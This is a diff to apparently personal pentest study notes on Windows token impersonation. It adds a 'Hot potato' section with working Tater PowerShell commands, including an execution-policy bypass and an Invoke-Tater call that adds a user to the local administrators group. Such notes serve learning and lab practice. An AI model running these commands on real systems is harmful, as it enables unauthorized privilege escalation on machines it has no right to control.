@@ -1,4 +1,4 @@
-# Token Impersonation
+# Token Impersonation - Potato attacks
 
 ## What is it
 
@@ -90,6 +90,14 @@
 - Any user that has logged in the target will have a token there until the target reboots
 
 ## Potato Attacks
+
+### Hot potato
+
+- We can use [Tater](https://github.com/Kevin-Robertson/Tater)
+- `powershell.exe -nop -ep bypass`
+- `Import-Module Tater.ps1`
+- `Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"`
+- Your user should be in the administrators group `net localgroup administrators` to check
 
 - See [here](../writeups/HTB-Jeeves.md) an example of a potato attack
 
